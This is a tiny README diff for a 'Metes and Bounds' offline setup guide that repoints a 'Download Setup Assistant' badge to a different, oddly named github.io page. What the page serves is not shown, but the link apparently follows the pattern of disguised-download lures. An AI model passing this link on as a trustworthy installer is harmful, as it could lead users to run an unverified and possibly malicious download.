@@ -1,6 +1,6 @@
 # Metes and Bounds — Offline Setup Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://metes-and-boundsguide-em.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://brandierombachcsfhe.github.io/.github/Metes-and-Bounds)
 
 ---
 
